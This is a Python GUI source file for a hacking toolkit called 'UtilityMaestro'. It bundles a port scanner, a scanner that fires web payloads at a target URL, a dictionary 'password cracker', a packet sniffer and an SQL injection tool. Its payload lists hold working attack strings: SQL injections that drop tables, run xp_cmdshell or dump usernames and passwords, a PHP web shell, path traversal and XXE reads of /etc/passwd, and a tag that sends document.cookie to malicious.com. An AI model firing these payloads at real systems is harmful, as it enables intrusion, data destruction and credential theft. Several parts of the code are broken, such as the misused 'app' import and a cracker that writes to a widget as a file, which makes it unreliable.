import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import threading
import requests
import scapy.all
from scapy.all import *
import urllib.parse
import re
from PIL import Image, ImageTk
import app


keywords_to_highlight = ["error", "success", "warning", "critical"]
# Constants
CORRECT_ACCESS_CODE = "1234"

TOOL_DESCRIPTIONS = {
    "Port Scanner": "Scan open ports on a target system.",
    "Vulnerability Scanner": "Scan for common vulnerabilities in a web application.",
    "Password Cracker": "Brute force or dictionary attack on password hashes.",
    "Network Sniffer": "Capture and analyze network traffic in a live, sortable way.",
    "SQL Injection Tool": "Test for SQL injection vulnerabilities in web applications.",
}

sql_injection_payloads = [
    {
        "payload": "' OR '1'='1'; -- ",
        "description": "Always true condition (1=1) to bypass authentication.",
    },
    {
        "payload": "' OR 1=1; -- ",
        "description": "Always true condition (1=1) to bypass authentication.",
    },
    {
        "payload": "' OR 'a'='a",
        "description": "Always true condition ('a'='a) to bypass authentication.",
    },
    {
        "payload": "') OR ('a'='a",
        "description": "Always true condition ('a'='a) to bypass authentication.",
    },
    {
        "payload": "'; WAITFOR DELAY '0:0:5' --",
        "description": "SQL injection with a delay to detect blind SQL injection.",
    },
    {
        "payload": "' AND 1=CONVERT(INT, (SELECT @@version)); --",
        "description": "Convert version information to an integer.",
    },
    {
        "payload": "UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --",
        "description": "Union-based SQL injection with null values in columns.",
    },
    {
        "payload": "'; DROP TABLE users; --",
        "description": "Attempt to drop the 'users' table.",
    },
    {
        "payload": "' OR EXISTS(SELECT * FROM information_schema.tables WHERE table_name = 'users'); --",
        "description": "Check if the 'users' table exists.",
    },
    {
        "payload": "' OR 1=1 UNION SELECT username, password FROM users; --",
        "description": "Union-based SQL injection to retrieve usernames and passwords.",
    },
    {
        "payload": "'; EXEC xp_cmdshell('dir'); --",
        "description": "Execute the 'dir' command on the server (for MS SQL Server).",
    },
    {
        "payload": "' UNION SELECT NULL, NULL, @@version, NULL, NULL, NULL, NULL, NULL, NULL, NULL --",
        "description": "Retrieve the database version.",
    },
    {
        "payload": "' OR 1=CAST((SELECT @@version) AS INT); --",
        "description": "Attempt to cast the version information to an integer.",
    },
]

# Common vulnerability checks
COMMON_VULNERABILITIES = [
    {
        "name": "Remote Code Execution",
        "payload": "<?php system($_GET['cmd']); ?>",
        "check": "Remote Code Execution Detected",
    },
    {
        "name": "File Inclusion",
        "payload": "../../../../etc/passwd",
        "check": "File Inclusion Detected",
    },
    {
        "name": "XSS (Cross-Site Scripting)",
        "payload": '<script>alert("XSS Vulnerability Detected");</script>',
        "check": "XSS Vulnerability Detected",
    },
    {
        "name": "SQL Injection",
        "payload": "1' OR '1'='1",
        "check": "SQL Vulnerability Detected",
    },
    {
        "name": "Command Injection",
        "payload": "; ls -la",
        "check": "Command Vulnerability Detected",
    },
    {
        "name": "Directory Traversal",
        "payload": "../../../../etc/passwd",
        "check": "Directory Traversal Detected",
    },
    {
        "name": "Cross-Site Request Forgery (CSRF)",
        "payload": '<img src="http://malicious.com/csrf?cookie='
                   '+document.cookie" alt="CSRF Attack"/>',
        "check": "CSRF Vulnerability Detected",
    },
    {
        "name": "Server-Side Request Forgery (SSRF)",
        "payload": "http://internal-server/admin",
        "check": "SSRF Vulnerability Detected",
    },
    {
        "name": "Insecure Deserialization",
        "payload": "O:4:\"User\":2:{s:4:\"name\";s:6:\"hacker\";"
                   "s:4:\"role\";s:5:\"admin\";}",
        "check": "Insecure Deserialization Detected",
    },
    {
        "name": "XML External Entity (XXE) Injection",
        "payload": '<?xml version="1.0" encoding="UTF-8"?>\n'
                   '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
                   '<foo>&xxe;</foo>',
        "check": "XXE Injection Detected",
    },
    {
        "name": "Server-Side Template Injection (SSTI)",
        "payload": "{{7*7}}",
        "check": "SSTI Vulnerability Detected",
    },
    # Add more vulnerabilities as needed
]


# Function to create a tool frame
def create_tool_frame(tool_name, notebook):
    tool_frame = ttk.Frame(notebook)
    notebook.add(tool_frame, text=tool_name)
    return tool_frame

# Function to update the access button state
def update_access_button_state():
    if acknowledgment_accepted.get():
        access_button.configure(state=tk.NORMAL)
    else:
        access_button.configure(state=tk.DISABLED)


# Function to create a label
def create_label(parent, text, font=None, pady=0):
    label = ttk.Label(parent, text=text, font=font)
    label.pack(pady=pady)


# Function to create a scrolled text widget
def create_scrolled_text(parent, wrap, width, height, padx=0, pady=0):
    text_widget = scrolledtext.ScrolledText(parent, wrap=wrap, width=width, height=height)
    text_widget.pack(padx=padx, pady=pady)
    return text_widget


# Function to create an entry widget
def create_entry(parent, width):
    entry = ttk.Entry(parent, width=width)
    entry.pack()
    return entry


# Function to create a button
def create_button(parent, text, command):
    button = ttk.Button(parent, text=text, command=command)
    button.pack()
    return button


# Function to perform port scanning
def port_scan(host, port_range, output_text):
    try:
        start_port, end_port = map(int, port_range.split('-'))
        output_text.delete(1.0, tk.END)

        for port in range(start_port, end_port + 1):
            sock = scapy.all.socket.socket(scapy.all.socket.AF_INET, scapy.all.socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((host, port))
            if result == 0:
                output_text.insert(tk.END, f"Port {port} is open\n")
            sock.close()

    except Exception as e:
        output_text.insert(tk.END, f"An error occurred: {str(e)}\n")


# Function to perform vulnerability scanning
def vulnerability_scan(target_url, output_text):
    try:
        output_text.delete(1.0, tk.END)
        response = requests.get(target_url)

        if response.status_code == 200:
            output_text.insert(tk.END, "Target web application is online.\n")
            vulnerabilities_found = []
            for vulnerability in COMMON_VULNERABILITIES:
                payload = vulnerability["payload"]
                check = vulnerability["check"]
                payload_response = requests.get(target_url + payload)
                if re.search(check, payload_response.text, re.IGNORECASE):
                    vulnerabilities_found.append(vulnerability["name"])

            if vulnerabilities_found:
                output_text.insert(tk.END, "Vulnerabilities detected:\n")
                for vuln in vulnerabilities_found:
                    output_text.insert(tk.END, f"- {vuln}\n")
            else:
                output_text.insert(tk.END, "No vulnerabilities detected.\n")
        else:
            output_text.insert(tk.END, f"Failed to connect to the target URL. Status code: {response.status_code}\n")

    except Exception as e:
        output_text.insert(tk.END, f"An error occurred: {str(e)}\n")
# Function to perform password cracking
def password_cracker(target_password, dictionary, output_text):
    # Iterate through the dictionary of passwords
    for password in dictionary:
        # Check if the current password matches the target password
        if password == target_password:
            # Password found, write it to the output file
            with open(output_text, 'w') as output_file:
                output_file.write(f"Password found: {password}\n")
            return

    # If the loop completes without finding the password, write a failure message
    with open(output_text, 'w') as output_file:
        output_file.write("Password not found\n")


def start_password_cracking(target_password, dictionary_file, output_text):
    try:
        # Read the dictionary file and split it into a list of passwords
        with open(dictionary_file, 'r') as dictionary_file:
            dictionary = [line.strip() for line in dictionary_file.readlines()]

        # Call the password cracker function
        password_cracker(target_password, dictionary, output_text)
    except FileNotFoundError:
        print("Dictionary file not found.")
    except Exception as e:
        print(f"An error occurred: {str(e)}")


# Example usage:
if __name__ == "__main__":
    target_password = "target_password"
    dictionary_file = "passwords.txt"  # Replace with your dictionary file path
    output_text = "output.txt"  # Replace with your output file path

    start_password_cracking(target_password, dictionary_file, output_text)


# Function to execute SQL injection testing
def execute_sql_injection(target_url, sql_payload, output_text):
    try:
        encoded_payload = urllib.parse.quote(sql_payload)
        full_url = target_url + "?param=" + encoded_payload

        response = requests.get(full_url)

        if "error" in response.text.lower():
            output_text.insert(tk.END, "SQL Injection Detected!\n")
        else:
            output_text.insert(tk.END, "No SQL Injection Detected.\n")

        output_text.insert(tk.END, "Response Content:\n")
        output_text.insert(tk.END, response.text)

    except Exception as e:
        output_text.insert(tk.END, f"An error occurred: {str(e)}\n")


# Function to create the Port Scanner tool
def create_port_scanner_tool(tool_frame):
    create_label(tool_frame, "Port Scanner", font=("Helvetica", 16), pady=10)
    host_label = create_label(tool_frame, "Target Host:")
    host_entry = create_entry(tool_frame, 40)
    port_range_label = create_label(tool_frame, "Port Range (e.g., 80-100):")
    port_range_entry = create_entry(tool_frame, 40)
    output_text = create_scrolled_text(tool_frame, tk.WORD, 80, 18, padx=10, pady=10)

    create_button(tool_frame, "Start Scan", lambda: port_scan(host_entry.get(), port_range_entry.get(), output_text))


# Function to create the Vulnerability Scanner tool
def create_vulnerability_scanner_tool(tool_frame):
    create_label(tool_frame, "Vulnerability Scanner", font=("Helvetica", 16), pady=10)
    target_label = create_label(tool_frame, "Target URL:")
    target_entry = create_entry(tool_frame, 40)
    output_text = create_scrolled_text(tool_frame, tk.WORD, 80, 18, padx=10, pady=10)

    create_button(tool_frame, "Start Scan", lambda: vulnerability_scan(target_entry.get(), output_text))

# Function to create the Password Cracker tool
def create_password_cracker_tool(tool_frame):
    create_label(tool_frame, "Password Cracker", font=("Helvetica", 16), pady=10)
    password_label = create_label(tool_frame, "Target Password:")
    password_entry = create_entry(tool_frame, 50)
    dictionary_label = create_label(tool_frame, "Dictionary File:")
    dictionary_entry = create_entry(tool_frame, 50)
    result_label = create_label(tool_frame, "Result:")
    result_text = create_scrolled_text(tool_frame, tk.WORD, 80, 18, padx=10, pady=10)

    create_button(tool_frame, "Start Cracking",
                  lambda: start_password_cracking(password_entry.get(), dictionary_entry.get(), result_text))

# Function to create the Network Sniffer tool
# Function to create the Network Sniffer tool with added functionalities
def create_network_sniffer_tool(tool_frame):
    create_label(tool_frame, "Network Sniffer", font=("Helvetica", 16), pady=10)

    color_code_label = ttk.Label(tool_frame, text="Color Code:")
    color_code_label.pack(anchor="w", padx=10)

    color_code_explanation = ttk.Label(
        tool_frame,
        text="- Red: Error messages\n- Green: Success messages\n- Blue: Packets",
        foreground="Orange",
        wraplength=400,
    )
    color_code_explanation.pack(anchor="w", padx=30)

    output_tree = ttk.Treeview(tool_frame, columns=("Packet Info",), show="headings")
    output_tree.heading("Packet Info", text="Packet Info")
    output_tree.column("Packet Info", width=800)
    output_tree.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

    packet_list = []

    def packet_capture(packet):
        if not stop_sniffing_flag:
            packet_info = packet.summary()
            packet_list.append(packet_info)
            real_time_analysis(packet_info)
            if "error" in packet_info.lower():
                output_tree.insert("", "end", values=(packet_info,), tags=("error",))
            elif "success" in packet_info.lower():
                output_tree.insert("", "end", values=(packet_info,), tags=("success",))
            else:
                output_tree.insert("", "end", values=(packet_info,), tags=("info",))
            output_tree.see(output_tree.get_children()[-1])

    def start_sniffing():
        nonlocal packet_list
        packet_list = []
        output_tree.delete(*output_tree.get_children())
        save_to_file = save_checkbox_var.get()

        def sniff_thread():
            global stop_sniffing_flag
            stop_sniffing_flag = False
            sniff(prn=packet_capture, filter="", iface=None, stop_filter=lambda x: stop_sniffing_flag)

        if hasattr(tool_frame, 'sniff_thread') and tool_frame.sniff_thread.is_alive():
            return

        tool_frame.sniff_thread = threading.Thread(target=sniff_thread, daemon=True)
        tool_frame.sniff_thread.start()
        start_button.configure(state=tk.DISABLED)
        stop_button.configure(state=tk.NORMAL)

    def stop_sniffing():
        global stop_sniffing_flag
        stop_sniffing_flag = True

        if hasattr(tool_frame, 'sniff_thread') and tool_frame.sniff_thread.is_alive():
            tool_frame.sniff_thread.join(timeout=1)

        start_button.configure(state=tk.NORMAL)
        stop_button.configure(state=tk.DISABLED)

    start_button = create_button(tool_frame, "Start Sniffing", start_sniffing)
    stop_button = create_button(tool_frame, "Stop Sniffing", stop_sniffing)
    stop_button.configure(state=tk.DISABLED)

    save_checkbox_var = tk.IntVar()
    save_checkbox = ttk.Checkbutton(tool_frame, text="Save to File", variable=save_checkbox_var)
    save_checkbox.pack()

    def real_time_analysis(packet_info):
        # Implement real-time analysis logic here
        # Highlight or flag suspicious packets in the packet list or treeview
        pass  # Placeholder, replace with actual implementation

    def export_to_pcap():
        # Implement logic to export captured packets to a PCAP file
        pass  # Placeholder, replace with actual implementation

    def view_packet_details():
        # Get the selected packet
        selected_item = output_tree.selection()
        if selected_item:
            packet_index = output_tree.index(selected_item)
            packet_info = packet_list[packet_index]

            # Open a new window to display packet details
            packet_details_window = tk.Toplevel(tool_frame)
            packet_details_window.title("Packet Details")

            # Create a text widget to display packet details
            packet_details_text = scrolledtext.ScrolledText(packet_details_window, wrap=tk.WORD, width=80, height=20)
            packet_details_text.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)
            packet_details_text.insert(tk.END, packet_info)
            packet_details_text.configure(state="disabled")
            pass

    def search_packets():
        # Implement logic to search for specific packets based on criteria
        search_term = search_entry.get()
        if search_term:
            output_tree.delete(*output_tree.get_children())  # Clear previous results
            for index, packet_info in enumerate(packet_list):
                if re.search(search_term, packet_info, re.IGNORECASE):
                    real_time_analysis(packet_info)  # Highlight matching packets
                    if "error" in packet_info.lower():
                        output_tree.insert("", "end", values=(packet_info,), tags=("error",))
                    elif "success" in packet_info.lower():
                        output_tree.insert("", "end", values=(packet_info,), tags=("success",))
                    else:
                        output_tree.insert("", "end", values=(packet_info,), tags=("info",))
                    output_tree.see(output_tree.get_children()[-1])
        pass  # Placeholder, replace with actual implementation

    def color_packets():
        # Implement logic to apply custom coloring to packets based on criteria
        # For example, you can color packets containing "error" in red
        for keyword in keywords_to_highlight:
            output_tree.tag_configure(keyword, foreground="red")
            pass

    view_details_button = ttk.Button(tool_frame, text="View Packet Details", command=view_packet_details)
    view_details_button.pack(pady=5)

    color_packets_button = ttk.Button(tool_frame, text="Color Packets", command=color_packets)
    color_packets_button.pack(pady=5)

    search_label = ttk.Label(tool_frame, text="Search Packets:")
    search_label.pack(pady=5)

    search_entry = ttk.Entry(tool_frame, width=40)
    search_entry.pack(pady=5)

    search_button = ttk.Button(tool_frame, text="Search", command=search_packets)
    search_button.pack(pady=5)

    # Apply different colors to text based on tags
    output_tree.tag_configure("error", foreground="red")
    output_tree.tag_configure("success", foreground="green")
    output_tree.tag_configure("info", foreground="blue")

# Function to authenticate access
def authenticate_access():
    entered_access_code = access_code_entry.get()
    if entered_access_code == CORRECT_ACCESS_CODE and acknowledgment_accepted.get():
        open_tools()
    elif not acknowledgment_accepted.get():
        messagebox.showerror("Acknowledgment Required",
                             "You must accept the acknowledgment before accessing the tools.")
    else:
        messagebox.showerror("Access Code Error", "Incorrect access code. To Obtain One, Visit Indulgein.co")


# Function to open the toolset
def open_tools():
    access_frame.pack_forget()
    notebook = ttk.Notebook(app)
    notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

    for tool_name, tool_description in TOOL_DESCRIPTIONS.items():
        tool_frame = create_tool_frame(tool_name, notebook)
        create_info_label(tool_frame, tool_description)
        if tool_name == "Port Scanner":
            create_port_scanner_tool(tool_frame)
        elif tool_name == "Vulnerability Scanner":
            create_vulnerability_scanner_tool(tool_frame)
        elif tool_name == "Password Cracker":
            create_password_cracker_tool(tool_frame)
        elif tool_name == "Network Sniffer":
            create_network_sniffer_tool(tool_frame)
        elif tool_name == "SQL Injection Tool":
            create_sql_injection_tool(tool_frame)


# Function to create an information label
def create_info_label(tool_frame, info_text):
    info_label = ttk.Label(tool_frame, text=info_text, wraplength=380)
    info_label.pack(padx=10, pady=10)


# Function to create a red label
def create_red_label(parent, text, pady=0):
    label = ttk.Label(parent, text=text, foreground="red", wraplength=380)
    label.pack(pady=pady)
    return label


# Function to create the SQL Injection Tool
def create_sql_injection_tool(tool_frame):
    create_label(tool_frame, "SQL Injection Tool", font=("Helvetica", 16), pady=10)
    target_label = create_label(tool_frame, "Target URL:")
    target_entry = create_entry(tool_frame, 50)
    payload_label = create_label(tool_frame, "SQL Payload:")
    target_url_label = create_label(tool_frame, "Target URL:")
    target_url_entry = create_entry(tool_frame, 50)

    # Create a label and combo box for selecting payloads
    payload_label = create_label(tool_frame, "Select Payload:")
    payload_combo = ttk.Combobox(tool_frame, values=[payload["description"] for payload in sql_injection_payloads],
                                 width=50)

    # Create a StringVar to store the selected payload description
    selected_payload_description = tk.StringVar()

    payload_combo = ttk.Combobox(tool_frame, values=[payload["payload"] for payload in sql_injection_payloads],
                                 width=50)
    payload_combo.pack()

    # Create and update the payload description label
    description_label = create_red_label(tool_frame, "", pady=5)
    description_label.config(textvariable=selected_payload_description)

    result_label = create_label(tool_frame, "Result:")
    result_text = create_scrolled_text(tool_frame, tk.WORD, 80,10, padx=10, pady=10)
    result_text.tag_configure("error", foreground="red")
    result_text.tag_configure("success", foreground="green")
    result_text.tag_configure("info", foreground="blue")

    def create_tool_frame(tool_name, notebook):
        tool_frame = ttk.Frame(notebook)
        notebook.add(tool_frame, text=tool_name)

        # Load the image you want to display in the top right corner
        tool_image = ImageTk.PhotoImage(file="maestro.png.png")  # Replace "your_image.png" with the actual image path

        # Create a Label for the tool image and position it in the top right corner
        tool_image_label = ttk.Label(tool_frame, image=tool_image)
        tool_image_label.grid(row=0, column=1, padx=10, pady=10, sticky=tk.NE)

        return tool_frame

    # Function to update the selected payload's description
    def execute_sql_injection_with_params():
        try:
            selected_payload_description = payload_combo.get()
            payload_index = next(
                (i for i, payload in enumerate(sql_injection_payloads) if
                 payload["description"] == selected_payload_description), -1)

            if payload_index != -1:
                # Get the selected payload from the list
                sql_payload = sql_injection_payloads[payload_index]["payload"]
                # Get the target URL from the entry field
                target_url = target_url_entry.get()

                # Construct a parameterized query
                payload = {"param": sql_payload}
                response = requests.get(target_url, params=payload)

                if "error" in response.text.lower():
                    result_text.insert(tk.END, "SQL Injection Detected!\n", "error")
                else:
                    result_text.insert(tk.END, "No SQL Injection Detected.\n", "success")

                # Present the response content with improved formatting
                formatted_response = response.text.replace('\n', '\n    ')
                result_text.insert(tk.END, "Response Content:\n", "info")
                result_text.insert(tk.END, f"\n    {formatted_response}\n")
            else:
                result_text.insert(tk.END, "Invalid payload selected.\n", "error")

        except Exception as e:
            result_text.insert(tk.END, f"An error occurred: {str(e)}\n", "error")

    # Create a button to execute SQL injection with parameterized queries
    execute_button = create_button(tool_frame, "Execute SQL Injection (Parameterized)",
    execute_sql_injection_with_params)

    def update_payload_description(event):
        selected_payload = payload_combo.get()
        payload_index = next(
            (i for i, payload in enumerate(sql_injection_payloads) if payload["payload"] == selected_payload), -1)
        if payload_index != -1:
            selected_payload_description.set(sql_injection_payloads[payload_index]["description"])
        else:
            selected_payload_description.set("")

    # Bind the update_payload_description function to the payload combo box
    payload_combo.bind("<<ComboboxSelected>>", update_payload_description)

    create_button(tool_frame, "Execute SQL Injection",
                  lambda: execute_sql_injection(target_entry.get(), payload_combo.get(), result_text))


# Main application setup
app = tk.Tk()
app.title("UtilityMaestro")

# Create a frame that covers the entire window and set its background color


# Calculate window position
screen_width = app.winfo_screenwidth()
screen_height = app.winfo_screenheight()
window_width = 800
window_height = 600
x = (screen_width - window_width) // 2
y = (screen_height - window_height) // 2
app.geometry(f"{window_width}x{window_height}+{x}+{y}")

# Create a custom style for the red text
custom_style = ttk.Style()
custom_style.configure("Red.TCheckbutton", foreground="red")

# Create the access frame
access_frame = ttk.Frame(app)
access_frame.pack(fill=tk.BOTH, expand=True)

image = Image.open("maestro.png")  # Replace with the path to your image file
image = image.resize((200, 100), Image.LANCZOS)  # Use LANCZOS filter
photo = ImageTk.PhotoImage(image)

# Create a label and display the image at the top
access_label = ttk.Label(access_frame, image=photo)
access_label.pack(side=tk.TOP, pady=10)  # Place the label at the top


info_label = ttk.Label(access_frame,
                       text="This is a versatile utility suite. Please enter the access code to access the tools.")
info_label.pack(pady=10)

access_code_label = ttk.Label(access_frame, text="Enter Access Code:")
access_code_label.pack(pady=20)

access_code_entry = ttk.Entry(access_frame, show="*")
access_code_entry.pack()

acknowledgment_accepted = tk.BooleanVar(value=False)

acknowledgment_checkbox = ttk.Checkbutton(
    access_frame,
    text=("By using UtilityMaestro, you agree to use it legally, "
          "the creator is not liable for any misuse or damage!"),
    variable=acknowledgment_accepted,
    command=update_access_button_state,
    style="Red.TCheckbutton",  # Apply the custom style
)
acknowledgment_checkbox.pack()

access_button = ttk.Button(access_frame, text="Access Tools", command=authenticate_access)
access_button.pack(pady=20)

info_label = ttk.Label(access_frame, text="Created By IndulgeIn. Version 0.82- Mirofurt", font=("Sans-serif", 7))
info_label.pack(pady=40)

# Create a scrolled text widget for the "Terms & Conditions" text
scrolled_text = scrolledtext.ScrolledText(access_frame, wrap=tk.WORD, width=60, height=0)
scrolled_text.pack(padx=20, pady=0, fill=tk.BOTH, expand=True)

# Insert the "Terms & Conditions" text into the scrolled text widget
terms_text = """
Terms & Conditions

1. Use of UtilityMaestro:
By using UtilityMaestro, you agree to use it in a legal and ethical manner. The creator of this tool is not liable for any misuse, damage, or illegal activities performed using this utility suite.

2. Responsibility:
You are solely responsible for your actions while using the tools provided by UtilityMaestro. Ensure that you have the necessary permissions and rights to perform any actions on target systems or applications.

3. Legality:
Respect and comply with all local, national, and international laws and regulations when using the tools within UtilityMaestro. Do not engage in any activities that may violate privacy, data protection, or other legal rights.

4. No Warranty:
The tools provided by UtilityMaestro are for educational and testing purposes only. They are provided "as is" without any warranty. The creator makes no guarantees regarding their effectiveness, accuracy, or suitability for any specific purpose.

5. Reporting Vulnerabilities:
If you discover any vulnerabilities or issues while using UtilityMaestro, please report them responsibly to the creator or relevant parties to address and rectify them.

6. Acknowledgment:
By using UtilityMaestro, you acknowledge and agree to these Terms & Conditions. If you do not agree with these terms, please do not use the toolset.

Please use UtilityMaestro responsibly and for legitimate purposes.
"""
scrolled_text.insert(tk.END, terms_text)
# Disable editing in the scrolled text widget
scrolled_text.configure(state="disabled")
# Initialize the application
app.mainloop()
